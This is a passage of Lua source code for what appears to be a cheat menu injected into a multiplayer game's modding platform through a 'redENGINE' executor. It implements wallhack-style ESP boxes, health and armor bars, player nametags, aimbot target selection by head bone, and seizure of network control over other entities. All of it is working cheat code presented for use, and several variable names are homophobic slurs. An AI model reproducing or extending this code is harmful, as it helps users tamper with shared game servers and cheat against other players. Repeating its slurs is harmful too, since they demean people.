true)Winnie_DisableControlAction(1,23,true)Winnie_DisableControlAction(1,24,true)Winnie_DisableControlAction(1,25,true)Winnie_DisableControlAction(1,45,true)Winnie_DisableControlAction(1,45,true)Winnie_DisableControlAction(1,80,true)Winnie_DisableControlAction(1,140,true)Winnie_DisableControlAction(1,250,true)Winnie_DisableControlAction(1,263,true)Winnie_DisableControlAction(1,310,true)Winnie_DisableControlAction(1,37,true)Winnie_DisableControlAction(1,73,true)Winnie_DisableControlAction(1,1,true)Winnie_DisableControlAction(1,2,true)Winnie_DisableControlAction(1,335,true)Winnie_DisableControlAction(1,336,true)Winnie_DisableControlAction(1,106,true)end
    local function mouseInBounds (x, y, w, h)
        local screenResolutionX, screenResolutionY = Winnie_GetNuiCursorPosition()  local widht, height = Winnie_GetActiveScreenResolution() screenResolutionX = screenResolutionX / widht screenResolutionY = screenResolutionY / height

        if (screenResolutionX > x - (w / 2) and screenResolutionY > y - (h / 2) and screenResolutionX < x + (w / 2) and screenResolutionY < y + (h / 2)) then
            return true
        else
            return false
        end
    end



    local CalculeCamCoords = function(distance, cam) local adjustedRotation = {x = (math.pi / 180) * GetCamRot(cam, 0).x,  y = (math.pi / 180) * GetCamRot(cam, 0).y, z = (math.pi / 180) * GetCamRot(cam, 0).z} local direction = {x = -math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), y = math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), z = math.sin(adjustedRotation.x)} local cameraRotation = GetCamRot(cam,0) local cameraCoord = GetCamCoord(cam) local destination = {x = cameraCoord.x + direction.x * distance, y = cameraCoord.y + direction.y * distance, z = cameraCoord.z + direction.z * distance} local a, b, c, d, e = GetShapeTestResult(StartShapeTestRay(cameraCoord.x, cameraCoord.y, cameraCoord.z, destination.x, destination.y, destination.z, -1, -1, 1)) return b, c, e end

    -- check entity

    local function Slider(w, x, Y, E, F, i, Z, S, _)
        if not rE_Slider["Slider_" .. S .. "_value"] then
            rE_Slider["Slider_" .. S .. "_value"] = 0
        end
        Winnie_DrawRect2(
            ReplaceXNice.position.x + w,
            ReplaceXNice.position.y + x,
            Y,
            E,
            i[1],
            i[2],
            i[3],
            i[4] or 255
        )
        Winnie_DrawRect2(
            ReplaceXNice.position.x + w,
            ReplaceXNice.position.y + x,
            Y * rE_Slider["Slider_" .. S .. "_value"],
            E,
            F[1],
            F[2],
            F[3],
            F[4] or 255
        )
        Winnie_DrawSprite2(
            "timerbars",
            "circle_checkpoints_big",
            ReplaceXNice.position.x + w +
                Y * rE_Slider["Slider_" .. S .. "_value"] -
                Y * .02,
            ReplaceXNice.position.y + x - E + ReplaceXNice.screen.h * .1 - 102,
            0.0060,
            0.010,
            0,
            255,
            255,
            255,
            New.opacity
        )




        AimeMilleMakeThis(
            ReplaceXNice.position.x + w +
                Y * rE_Slider["Slider_" .. S .. "_value"] -
                Y * .02 -
                12,
            ReplaceXNice.position.y + x - E + ReplaceXNice.screen.h * .1 - 108,
            255,
            255,
            255,
            255,
            tostring(
                _ and
                    circlepoint(
                        _ *
                            (rE_Slider["Slider_" .. S .. "_value"] or
                                0)
                    ) or
                    rE_Slider["Slider_" .. S .. "_value"] or
                    0
            ),
            4,
            true,
            E / ReplaceXNice.screen.h * 45
        )
        if
            mouseBounds(
                ReplaceXNice.position.x + w,
                ReplaceXNice.position.y + x,
                ReplaceXNice.position.w + Y,
                ReplaceXNice.position.h + E
            )
        then
            if Winnie_IsDisabledControlPressed(0, 174) then
                if rE_Slider["Slider_" .. S .. "_value"] > 0 then
                    if
                        rE_Slider["Slider_" .. S .. "_value"] -
                            0.01 <
                            0
                    then
                        rE_Slider["Slider_" .. S .. "_value"] = 0
                    else
                        rE_Slider["Slider_" .. S .. "_value"] =
                            rE_Slider["Slider_" .. S .. "_value"] -
                            0.01
                    end
                end
            end
            if
                mouseBounds(
                    ReplaceXNice.position.x + w,
                    ReplaceXNice.position.y + x,
                    ReplaceXNice.position.w + Y,
                    ReplaceXNice.position.h + E
                )
            then
                if Winnie_IsDisabledControlPressed(0, 175) then
                    if rE_Slider["Slider_" .. S .. "_value"] < 1 then
                        if
                            rE_Slider["Slider_" .. S .. "_value"] +
                                0.01 >
                                1
                        then
                            rE_Slider["Slider_" .. S .. "_value"] =
                                1
                        else
                            rE_Slider["Slider_" .. S .. "_value"] =
                                rE_Slider[
                                "Slider_" .. S .. "_value"
                            ] + 0.01
                        end
                    end
                end
            end


                if Winnie_IsDisabledControlPressed(0, 24) then
                    rE_Slider["Slider_" .. S .. "_dragging"] = {
                        ReplaceXNice.cursor.x
                    }
                end
            end

            if Winnie_IsDisabledControlReleased(0, 24) then
                rE_Slider["Slider_" .. S .. "_dragging"] = nil
            end

            if rE_Slider["Slider_" .. S .. "_dragging"] then
                rE_Slider["Slider_" .. S .. "_value"] =
                    crampe((ReplaceXNice.cursor.x - (ReplaceXNice.position.x + w)) / Y, 0, 1)
            end
        end

    local function crampe (R, S, T)
        return math.min(math.max(R, S), T)
    end

    local function Quaternion (rot)
            local pitch, roll, yaw = math.rad(rot.x), math.rad(rot.y), math.rad(rot.z)
            local cy, sy, cr, sr, cp, sp =
                math.cos(yaw * 0.5),
                math.sin(yaw * 0.5),
                math.cos(roll * 0.5),
                math.sin(roll * 0.5),
                math.cos(pitch * 0.5),
                math.sin(pitch * 0.5)
            return quat(
                cy * cr * cp + sy * sr * sp,
                cy * sp * cr - sy * cp * sr,
                cy * cp * sr + sy * sp * cr,
                sy * cr * cp - cy * sr * sp
            )
        end



    local function Diversion(w, x, C, P, Q, g, R, e)
        Winnie_DrawRect(w + C / 2, x + P / 2, C, P, Q, g, R, e)
    end
    local function rot(rotation)
        local retz = math.rad(rotation.z)
        local retx = math.rad(rotation.x)
        local absx = math.abs(math.cos(retx))
        return vec3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
    end
    local function launchwebsite(url)
        local streamOfflineURL = url
        local duiObj = Winnie_CreateDui(streamOfflineURL, 1, 1)
        SetDuiUrl(duiObj,url)
    end
    local function Directionnel(rotation)
        local adjustedRotation = {
            x = (math.pi / 180) * rotation.x,
            y = (math.pi / 180) * rotation.y,
            z = (math.pi / 180) * rotation.z
        }
        local direction = {
            x = -math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)),
            y = math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)),
            z = math.sin(adjustedRotation.x)
        }
        return direction
    end

    local function main()
        local b, c, d, e, f, g = 10000000, nil

        for k, h in pairs(GetGamePool("CPed")) do
            if h ~= Winnie_PlayerPedId() then
                local j = Winnie_GetPedBoneCoords(h, 0x9995)
                local k, l, m = Winnie_GetScreenCoordFromWorldCoord(j.x, j.y, j.z)
                local n = #vector2(l - 0.5, m - 0.5)
                if n < b then
                    b, c, d, e, f, g = n, h, k, l, m, j
                end
            end
        end
        return c, g, d, e, f
    end

    local function CalculateRotation(coords)
        return vector3(math.deg(math.atan2(coords.z, #vector2(coords.x, coords.y))), 0.0, -math.deg(math.atan2(coords.x, coords.y)))
    end
    local function name(hash) -- lol nice weaponhash
        for i = 1, #weapons do -- lol nice weapon hash
                -- wtf a space ??
            if Winnie_GetHashKey(weapons[i]) == hash then -- yes yes lol nice weapon hash
                return string.sub(weapons[i], 8) -- yes yes nice string
            end -- small end yes yes
        end -- yes its the end
    end
    function Float(value, w)
        local p = math.ceil(math.log10(value))
        local prec = value <= 1 and w - 1 or p > w and 0 or w - p
        return string.format('%.' .. prec .. 'f', value)
    end

    function RequestControlOnce(ngt2A)
        if not NetworkIsInSession() or NetworkHasControlOfEntity(ngt2A) then
            return true
        end
        SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(ngt2A), true)
        return NetworkRequestControlOfEntity(ngt2A)
    end
    local function scriptresourceexist(script)
        if GetResourceState(script) == "started" or GetResourceState(string.lower(script)) == "started" or GetResourceState(string.upper(script)) == "started" then
            return true
        else
            return false
        end
    end

    local function Winnie_DrawText(text, x, y, outline, size, centre, r, g, b, a)
        BeginTextCommandDisplayText("STRING")
        AddTextComponentSubstringPlayerName(text)
        EndTextCommandDisplayText(x, y)
    end

    local function tetetetete(text, x, y, scale, font, outline, center, r, g, b)
        Winnie_SetTextScale(0.0, scale)
        Winnie_SetTextFont(font)
        if outline then
            Winnie_SetTextOutline(outline)
        end
        Winnie_SetTextCentre(center)
        Winnie_SetTextColour(r, g, b, 255)
        Winnie_BeginTextCommandDisplayText('TWOSTRINGS')
        Winnie_AddTextComponentString(text)
        Winnie_EndTextCommandDisplayText(x, y-0.011)
    end

    local function CalculateWidth(str, font, scale)
        Winnie_BeginTextCommandWidth("STRING")
        Winnie_AddTextComponentSubstringPlayerName(str)
        Winnie_SetTextFont(font or 4)
        Winnie_SetTextScale(scale or 0.35, scale or 0.35)
        local length = Winnie_EndTextCommandGetWidth(1)
        return length
    end









    local function Winnie_DrawText2(text, x, y)
        BeginTextCommandDisplayText("STRING")
        AddTextComponentSubstringPlayerName(text)
        EndTextCommandDisplayText(x, y)
    end



    local function DrawVehicle(text, x, y, z, outline, size, centre, r, g, b, a)
        Winnie_SetTextFont(6)
        Winnie_SetDrawOrigin(x, y, z, 0)
        if outline then
            Winnie_SetTextOutline(true)
        end
        if not a then
            Winnie_SetTextColour(r, g, b, 150)
        else
            Winnie_SetTextColour(r, g, b, a)
        end
        Winnie_SetTextScale(100.0, size)
        Winnie_SetTextEntry("STRING")
        Winnie_AddTextComponentSubstringWebsite(text)
        Winnie_EndTextCommandDisplayText(0.0, 0.0)
    end


    local function slider2(x, y, w, S, _)
        local cursorX, cursorY = Winnie_GetNuiCursorPosition()
        local screenW, screenH = Winnie_GetActiveScreenResolution()
        cursorX = cursorX / screenW
        cursorY = cursorY / screenH

        x = x + New.x
        y = y + New.y

        if not rE_Slider["Slider_" .. S .. "_value"] then
            rE_Slider["Slider_" .. S .. "_value"] = 0.6
        end
        Winnie_DrawRect(x, y, w, 0.004, 60, 60, 60, New.opacity)
        local calculationSlider = rE_Slider["Slider_" .. S .. "_value"] / 1.0 --[[maxvalue]] * w
        Winnie_DrawRect(
            x - w / 2 + calculationSlider / 2,
            y,
            calculationSlider,
            0.004,
            math.floor(255 * rE_Slider["Slider_colormenur_value"]),
            math.floor(255 * rE_Slider["Slider_colormenug_value"]),
            math.floor(255 * rE_Slider["Slider_colormenub_value"]),
            New.opacity
        )
        --Winnie_DrawSprite("cicrle","circleezaaa", x - w / 2 + calculationSlider, y +  0.006, 0.0123, 0.0123 * 1.8,0.0,255,255,255,255)
        redENGINE.DrawImage(circle, x - w / 2 + calculationSlider, y + 0.001, 0.01, 0.01);

       -- Winnie_DrawSprite('afzgfrezgergergerg', 'zefhuzeufezufhzeufh', New.x + 0.54,  New.y + 0.750, 0.60, 0.60 * 1.8, 0.0, 255, 255, 255, New.opacity)

        Winnie_DrawText(
            tostring(
                _ and circlepoint(_ * (rE_Slider["Slider_" .. S .. "_value"] or 0)) or rE_Slider["Slider_" .. S .. "_value"] or
                    0
            ),
            x - w / 2 + calculationSlider - 0.008,
            y - 0.003,
            true,
            0.17,
            false,
            255,
            255,
            255,
            New.opacity
        )

        if mouseInBounds(x, y, w, 0.015) then
            if Winnie_IsDisabledControlPressed(0, 174) then
                if rE_Slider["Slider_" .. S .. "_value"] > 0 then
                    if
                        rE_Slider["Slider_" .. S .. "_value"] -
                            0.01 <
                            0
                    then
                        rE_Slider["Slider_" .. S .. "_value"] = 0
                    else
                        rE_Slider["Slider_" .. S .. "_value"] =
                            rE_Slider["Slider_" .. S .. "_value"] -
                            0.01
                    end
                end
            end

            if Winnie_IsDisabledControlPressed(0, 175) then
                if rE_Slider["Slider_" .. S .. "_value"] < 1 then
                    if
                        rE_Slider["Slider_" .. S .. "_value"] +
                            0.01 >
                            1
                    then
                        rE_Slider["Slider_" .. S .. "_value"] =
                            1
                    else
                        rE_Slider["Slider_" .. S .. "_value"] =
                            rE_Slider[
                            "Slider_" .. S .. "_value"
                        ] + 0.01
                    end
                end
            end
        end

        if mouseInBounds(x, y, w, 0.015) and Winnie_IsDisabledControlPressed(0, 24) then
            if iden == S .. x .. y and not ZM_M1000.ama and not ZM_M1000.hFH then
                rE_Slider["Slider_" .. S .. "_value"] = Float((cursorX - (x - w / 2)) / w * 1.0 --[[ replace]], 2)
                if not Winnie_IsDisabledControlPressed(0, 24) then
                    iden = false
                end
            end
            rE_Slider["Slider_" .. S .. "_value"] = crampe((cursorX - (x - w / 2)) / w * 1.0, 0, 1)
        end
    end





    local taberino = "Misc"





    local function BoxesKeyboard(v)

        local bonesCoords = GetPedBoneCoords(v, 31086, 0, 0, 0)

        local screenX, screenY = GetActiveScreenResolution()
        local positionX, positionY = redENGINE.WorldToScreen(bonesCoords.x, bonesCoords.y, bonesCoords.z + 1.04);
        local k = GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), bonesCoords.x, bonesCoords.y, bonesCoords.z, true) / ( 1.1 - 100 * 9)
    
        local health = GetEntityHealth(v) - 100
        local armor = GetPedArmour(v)
        local multiplication1 = 0.070 * (health / 100)
        local multiplication2 = 0.0648 * (armor / 100)  

        local conversionX = 1 / screenX
        local conversionY = 1 / screenY 
    
        
        local heightBox = 0.25
        local widthBox = heightBox * (screenX / screenY) / 7
        local r, g, b, a = SliderKeyboard["espr"].value, SliderKeyboard["espg"].value, SliderKeyboard["espb"].value, 255
    

        SetDrawOrigin(GetPedBoneCoords(v, 31086), 0)
                    

        if HasEntityClearLosToEntity(PlayerPedId(), v, 17) then  
                if ZM_KeyboardUI.Checkbox["boxopa-function"] and ZM_KeyboardUI.Checkbox["boxesp-function"] and not Winnie_IsEntityDead(v) and IsEntityOnScreen(v) then
                    DrawRect(positionX, positionY - 0.215 / 100 / k, widthBox / 100 / k, heightBox / 100 / k, 0, 0, 0, SliderKeyboard["espopacity"].value)
                end

                if ZM_KeyboardUI.fgt and ZM_KeyboardUI.faggot and not Winnie_IsEntityDead(v) and ZM_KeyboardUI.Checkbox["boxesp-function"] and IsEntityOnScreen(v) then
                    DrawRect(positionX, positionY - 0.09 / 100 / k, widthBox / 100 / k, 0.002, r, g, b, a) -- haut
                    DrawRect(positionX, positionY - 0.34 / 100 / k, widthBox / 100 / k, 0.002, r, g, b, a) -- bas
            
                    DrawRect(positionX - 0.032 / 100 / k, positionY - 0.215 / 100 / k, 0.001, heightBox / 100 / k, r, g, b, a) -- droite
                    DrawRect(positionX + 0.032 / 100 / k, positionY - 0.215 / 100 / k, 0.001, heightBox / 100 / k, r, g, b, a) -- gauche
                end

                -- outine box


            if not Winnie_IsEntityDead(v) and ZM_KeyboardUI.Checkbox["healthbar-function"] and IsEntityOnScreen(v) then
                if health >= 70 and health <= 100 then
                    Diversion(positionX + 0.034 / 100 / k - 0.0013, positionY - 0.34 / 100 / k, 0.001, 0.0025 / k, 10, 10, 10, 255)
                    Diversion(positionX + 0.034 / 100 / k - 0.0013, positionY - 0.34 / 100 / k, 0.001, 0.0358 * multiplication1 / k, 70, 255, 0, 255)
                elseif health >= 50 and health <= 69 then
                    Diversion(positionX + 0.034 / 100 / k - 0.0013, positionY - 0.34 / 100 / k, 0.001, 0.0025 / k, 10, 10, 10, 255)
                    Diversion(positionX + 0.034 / 100 / k - 0.0013, positionY - 0.34 / 100 / k, 0.001, 0.0358 * multiplication1 / k, 255, 85, 0, 255)
                elseif health >= 0 and health <= 49 then
                    Diversion(positionX + 0.034 / 100 / k - 0.0013, positionY - 0.34 / 100 / k, 0.001, 0.0025 / k, 10, 10, 10, 255)
                    Diversion(positionX + 0.034 / 100 / k - 0.0013, positionY - 0.34 / 100 / k, 0.001, 0.0358 * multiplication1 / k, 255, 0, 0, 255)
                end
            end

            if not Winnie_IsEntityDead(v) and ZM_KeyboardUI.Checkbox["armorbar-function"] and IsEntityOnScreen(v) then
                if armor <= 0 then
                    Diversion(positionX - 0.032 / 100 / k, positionY - 0.34 / 100 / k + 0.002, 0.00064 / k, 0.002, 0, 0, 0, 255)
                    Diversion(positionX - 0.032 / 100 / k, positionY - 0.34 / 100 / k + 0.002, multiplication2 / 100 / k,0.002,0,0, 0,255)
                else
                    Diversion(positionX - 0.032 / 100 / k, positionY - 0.34 / 100 / k + 0.002, 0.00064 / k, 0.002, 0, 0, 0, 255)
                    Diversion(positionX - 0.032 / 100 / k, positionY - 0.34 / 100 / k + 0.002, multiplication2 / 100 / k, 0.002,0,58,255,255)
                end
            end
        end
    end



            local function BoxesExternal(ped)

                local bonesCoords = GetPedBoneCoords(ped, 31086, 0, 0, 0)

                if booleanCheck.includeself == enable then
                    ZM_M1000.faggot = ped
                else
                    ZM_M1000.faggot = ped ~= Winnie_PlayerPedId()
                end

                if booleanCheck.includeplayers == enable then
                    ZM_M1000.fgt = Winnie_IsPedAPlayer(ped)
                else
                    ZM_M1000.fgt = ped
                end



                local k = Winnie_GetDistanceBetweenCoords(Winnie_GetFinalRenderedCamCoord(), bonesCoords.x, bonesCoords.y, bonesCoords.z,true) / ( 1.1 - 100 * 9)
                local distance = GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), bonesCoords.x, bonesCoords.y, bonesCoords.z, true)
                local health = Winnie_GetEntityHealth(ped) - 100
                local armor = Winnie_GetPedArmour(ped)
                local multiplication1 = 0.070 * (health / 100)
                local multiplication2 = 0.061 * (armor / 100)






                    if distance <= 1000.0 then

                        if ZM_M1000.fgt and ZM_M1000.faggot then
                        if booleanCheck.fillbox and booleanCheck.boxes == enable and not Winnie_IsEntityDead(ped) and IsEntityOnScreen(ped) then
                            if math.floor(tonumber(booleanCheck.opcacityfillboxslider)) > 0 then
                                DrawRect(0.0, -0.080 / 100 / k, 0.06 / 100 / k, 0.25 / 100 / k, 0, 0, 0, math.floor(tonumber(booleanCheck.opcacityfillboxslider)))
                            else
                                DrawRect(0.0, -0.080 / 100 / k, 0.06 / 100 / k, 0.25 / 100 / k, 0, 0, 0, 100)
                            end
                        end


                    if ZM_M1000.fgt and ZM_M1000.faggot and not Winnie_IsEntityDead(ped) and booleanCheck.boxes == enable and IsEntityOnScreen(ped) then

                        if math.floor(tonumber(booleanCheck.colorrslider)) and math.floor(tonumber(booleanCheck.colorgslider)) and math.floor(tonumber(booleanCheck.colorbslider)) > 0 then

                            DrawRect(0.03 / 100 / k, -0.080 / 100 / k, 0.001, 0.25 / 100 / k, math.floor(tonumber(booleanCheck.colorrslider)), math.floor(tonumber(booleanCheck.colorgslider)), math.floor(tonumber(booleanCheck.colorbslider)), 255)
                            DrawRect(-0.03 / 100 / k, -0.080 / 100 / k, 0.001, 0.25 / 100 / k, math.floor(tonumber(booleanCheck.colorrslider)), math.floor(tonumber(booleanCheck.colorgslider)), math.floor(tonumber(booleanCheck.colorbslider)), 255)
                            DrawRect(0.0, 0.045 / 100 / k, 0.060 / 100 / k, 0.0013, math.floor(tonumber(booleanCheck.colorrslider)), math.floor(tonumber(booleanCheck.colorgslider)), math.floor(tonumber(booleanCheck.colorbslider)), 255)
                            DrawRect(0.0, -0.205 / 100 / k, 0.060 / 100 / k, 0.0013, math.floor(tonumber(booleanCheck.colorrslider)), math.floor(tonumber(booleanCheck.colorgslider)), math.floor(tonumber(booleanCheck.colorbslider)), 255)
                        else
                            DrawRect(0.03 / 100 / k, -0.080 / 100 / k, 0.001, 0.25 / 100 / k, 255, 255, 255, 255)
                            DrawRect(-0.03 / 100 / k, -0.080 / 100 / k, 0.001, 0.25 / 100 / k, 255, 255, 255, 255)
                            DrawRect(0.0, 0.045 / 100 / k, 0.060 / 100 / k, 0.0013, 255, 255, 255, 255)
                            DrawRect(0.0, -0.205 / 100 / k, 0.060 / 100 / k, 0.0013, 255, 255, 255, 255)
                        end
                    end

                        -- outine box


                    if not Winnie_IsEntityDead(ped) and booleanCheck.healbar == enable and IsEntityOnScreen(ped) then
                            if health >= 70 and health <= 100 then
                                Diversion(0.033 / 100 / k - 0.0013, -0.205 / 100 / k, 0.001, 0.0025 / k, 10, 10, 10, 255)
                                Diversion(0.033 / 100 / k - 0.0013, -0.205 / 100 / k, 0.001, 0.0358 * multiplication1 / k, 70, 255, 0, 255)
                            elseif health >= 50 and health <= 69 then
                                Diversion(0.033 / 100 / k - 0.0013, -0.205 / 100 / k, 0.001, 0.0025 / k, 10, 10, 10, 255)
                                Diversion(0.033 / 100 / k - 0.0013, -0.205 / 100 / k, 0.001, 0.0358 * multiplication1 / k, 255, 85, 0, 255)
                            elseif health >= 0 and health <= 49 then
                                Diversion(0.033 / 100 / k - 0.0013, -0.205 / 100 / k, 0.001, 0.0025 / k, 10, 10, 10, 255)
                                Diversion(0.033 / 100 / k - 0.0013, -0.205 / 100 / k, 0.001, 0.0358 * multiplication1 / k, 255, 0, 0, 255)
                            end
                        end

                    if not Winnie_IsEntityDead(ped) and booleanCheck.armorbar == enable and IsEntityOnScreen(ped) then
                            if armor <= 0 then
                                Diversion(-0.031 / 100 / k, -0.205 / 100 / k + 0.002, 0.000607 / k, 0.0018, 0, 0, 0, 255)
                                Diversion(-0.031 / 100 / k, -0.205 / 100 / k + 0.002, multiplication2 / 100 / k,0.002,0,0, 0,255)
                            else
                                Diversion(-0.031 / 100 / k, -0.205 / 100 / k + 0.002, 0.000607 / k, 0.0018, 0, 0, 0, 255)
                                Diversion(-0.031 / 100 / k, -0.205 / 100 / k + 0.002, multiplication2 / 100 / k, 0.002,0,58,255,255)
                                    end
                                end
                            end
                        end
                    end



                    function Boxes(v)
                        local bonesCoords = GetPedBoneCoords(v, 31086, 0, 0, 0)
           
                        local screenX, screenY = GetActiveScreenResolution()
                        local positionX, positionY = redENGINE.WorldToScreen(bonesCoords.x, bonesCoords.y, bonesCoords.z + 1.04);
                        local k = GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), bonesCoords.x, bonesCoords.y, bonesCoords.z, true) / ( 1.1 - 100 * 9)
                    
                        local health = GetEntityHealth(v) - 100
                        local armor = GetPedArmour(v)
                        local multiplication1 = 0.070 * (health / 100)
                        local multiplication2 = 0.0648 * (armor / 100)   
                    
                      
                        local conversionX = 1 / screenX
                        local conversionY = 1 / screenY 
                    
                        
                        local heightBox = 0.25
                        local widthBox = heightBox * (screenX / screenY) / 7
                        local r, g, b, a = math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255
                    
                    
                        SetDrawOrigin(GetPedBoneCoords(v, 31086), 0)
                    
                        if HasEntityClearLosToEntity(PlayerPedId(), v, 17) then
                            if ZM_M1000.flbox and ZM_M1000.boxes and not Winnie_IsEntityDead(v) then
                                DrawRect(positionX, positionY - 0.215 / 100 / k, widthBox / 100 / k, heightBox / 100 / k, 0, 0, 0, 50) -- boxes intégrale
                            end
                            if ZM_M1000.fgt and ZM_M1000.faggot and not Winnie_IsEntityDead(v) and ZM_M1000.boxes then
                                DrawRect(positionX, positionY - 0.09 / 100 / k, widthBox / 100 / k, 0.002, r, g, b, a) -- haut
                                DrawRect(positionX, positionY - 0.34 / 100 / k, widthBox / 100 / k, 0.002, r, g, b, a) -- bas
                        
                                DrawRect(positionX - 0.032 / 100 / k, positionY - 0.215 / 100 / k, 0.001, heightBox / 100 / k, r, g, b, a) -- droite
                                DrawRect(positionX + 0.032 / 100 / k, positionY - 0.215 / 100 / k, 0.001, heightBox / 100 / k, r, g, b, a) -- gauche
                            end
                            if not Winnie_IsEntityDead(v) and ZM_M1000.hbar and IsEntityOnScreen(v) then
                                if health >= 70 and health <= 100 then
                                    Diversion(positionX + 0.034 / 100 / k - 0.0013, positionY - 0.34 / 100 / k, 0.001, 0.0025 / k, 10, 10, 10, 255)
                                    Diversion(positionX + 0.034 / 100 / k - 0.0013, positionY - 0.34 / 100 / k, 0.001, 0.0358 * multiplication1 / k, 70, 255, 0, 255)
                                elseif health >= 50 and health <= 69 then
                                    Diversion(positionX + 0.034 / 100 / k - 0.0013, positionY - 0.34 / 100 / k, 0.001, 0.0025 / k, 10, 10, 10, 255)
                                    Diversion(positionX + 0.034 / 100 / k - 0.0013, positionY - 0.34 / 100 / k, 0.001, 0.0358 * multiplication1 / k, 255, 85, 0, 255)
                                elseif health >= 0 and health <= 49 then
                                    Diversion(positionX + 0.034 / 100 / k - 0.0013, positionY - 0.34 / 100 / k, 0.001, 0.0025 / k, 10, 10, 10, 255)
                                    Diversion(positionX + 0.034 / 100 / k - 0.0013, positionY - 0.34 / 100 / k, 0.001, 0.0358 * multiplication1 / k, 255, 0, 0, 255)
                                end
                            end
                            if not Winnie_IsEntityDead(v) and ZM_M1000.abar and IsEntityOnScreen(v) then
                                if armor <= 0 then
                                    Diversion(positionX - 0.032 / 100 / k, positionY - 0.34 / 100 / k + 0.002, 0.00064 / k, 0.002, 0, 0, 0, 255)
                                    Diversion(positionX - 0.032 / 100 / k, positionY - 0.34 / 100 / k + 0.002, multiplication2 / 100 / k,0.002,0,0, 0,255)
                                else
                                    Diversion(positionX - 0.032 / 100 / k, positionY - 0.34 / 100 / k + 0.002, 0.00064 / k, 0.002, 0, 0, 0, 255)
                                    Diversion(positionX - 0.032 / 100 / k, positionY - 0.34 / 100 / k + 0.002, multiplication2 / 100 / k, 0.002,0,58,255,255)
                                end
                            end
                        end
                    
                    
                        ClearDrawOrigin()
                    end
                    



    local function NameTagKeyboard()

        for k, v in pairs(GetActivePlayers()) do
            local pedSelect = Winnie_GetPlayerPed(v)
            local boneCoords = Winnie_GetPedBoneCoords(pedSelect, 31086, 0.0, 0.0, 0.0)


            if ZM_KeyboardUI.Checkbox["includeself-function"] then
                ZM_KeyboardUI.faggot = pedSelect
            else
                ZM_KeyboardUI.faggot = pedSelect ~= Winnie_PlayerPedId()
            end




            local _, _x, _y = Winnie_GetScreenCoordFromWorldCoord(boneCoords.x, boneCoords.y, boneCoords.z)
            local d = Winnie_GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), boneCoords.x, boneCoords.y, boneCoords.z, true)
            if d <= SliderKeyboard["espdistance"].value and ZM_KeyboardUI.faggot then
                if NetworkIsPlayerTalking(v) then
                    tetetetete(NetworkPlayerGetName(v), _x + 0.000001  / _x + 0.0003, _y - 0.38 / GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), boneCoords.x, boneCoords.y, boneCoords.z, false) - 0.01, 0.20, 4, false, false, 255, 0, 255)
                else
                    tetetetete(NetworkPlayerGetName(v), _x + 0.000001  / _x + 0.0003, _y - 0.38 / GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), boneCoords.x, boneCoords.y, boneCoords.z, false) - 0.01, 0.20, 4, false, false, 255, 255, 255)
                end
            end
        end
    end


    local function NameTagExternal()

        for k, v in pairs(GetActivePlayers()) do
            local pedSelect = Winnie_GetPlayerPed(v)
            local boneCoords = Winnie_GetPedBoneCoords(pedSelect, 31086, 0.0, 0.0, 0.0)


            if booleanCheck.includeself == enable then
                ZM_M1000.faggot = ped
            else
                ZM_M1000.faggot = ped ~= Winnie_PlayerPedId()
            end

            if booleanCheck.includeplayers == enable then
                ZM_M1000.fgt = Winnie_IsPedAPlayer(ped)
            else
                ZM_M1000.fgt = ped
            end




            local _, _x, _y = Winnie_GetScreenCoordFromWorldCoord(boneCoords.x, boneCoords.y, boneCoords.z)
            local d = Winnie_GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), boneCoords.x, boneCoords.y, boneCoords.z, true)
            if d <= 3000.0 and ZM_M1000.faggot then
                if NetworkIsPlayerTalking(v) then
                    tetetetete(NetworkPlayerGetName(v), _x + 0.000001  / _x + 0.0003, _y - 0.38 / GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), boneCoords.x, boneCoords.y, boneCoords.z, false) - 0.01, 0.20, 4, false, false, 255, 0, 255)
                else
                    tetetetete(NetworkPlayerGetName(v), _x + 0.000001  / _x + 0.0003, _y - 0.38 / GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), boneCoords.x, boneCoords.y, boneCoords.z, false) - 0.01, 0.20, 4, false, false, 255, 255, 255)
                end
            end
        end
    end


    local function NameTag()

        for k, v in pairs(GetActivePlayers()) do
            local pedSelect = Winnie_GetPlayerPed(v)
            local boneCoords = Winnie_GetPedBoneCoords(pedSelect, 31086, 0.0, 0.0, 0.0)


            if ZM_M1000.icnself then
                ZM_M1000.faggot = pedSelect
            else
                ZM_M1000.faggot = pedSelect ~= Winnie_PlayerPedId()
            end




            local _, _x, _y = Winnie_GetScreenCoordFromWorldCoord(boneCoords.x, boneCoords.y, boneCoords.z)
            local d = Winnie_GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), boneCoords.x, boneCoords.y, boneCoords.z, true)
            if d <= math.abs(3000 * rE_Slider["Slider_espdistance_value"]) and ZM_M1000.faggot then
                if NetworkIsPlayerTalking(v) then
                    tetetetete(NetworkPlayerGetName(v), _x + 0.000001  / _x + 0.0003, _y - 0.38 / GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), boneCoords.x, boneCoords.y, boneCoords.z, false) - 0.01, 0.20, 4, false, false, 255, 0, 255)
                else
                    tetetetete(NetworkPlayerGetName(v), _x + 0.000001  / _x + 0.0003, _y - 0.38 / GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), boneCoords.x, boneCoords.y, boneCoords.z, false) - 0.01, 0.20, 4, false, false, 255, 255, 255)
                end
            end
        end
    end


    local function EspWeaponKeyboard(v)
        local boneCoords = GetEntityCoords(v)
        local c, d = Winnie_GetCurrentPedWeapon(v, true)
        local al = name(d)





        local e, f, g = boneCoords.x, boneCoords.y, boneCoords.z
        local h, i, j = table.unpack(GetGameplayCamCoord())
        local l, m, n = GetScreenCoordFromWorldCoord(e, f, g + 1.04)
        local k =
            GetDistanceBetweenCoords(
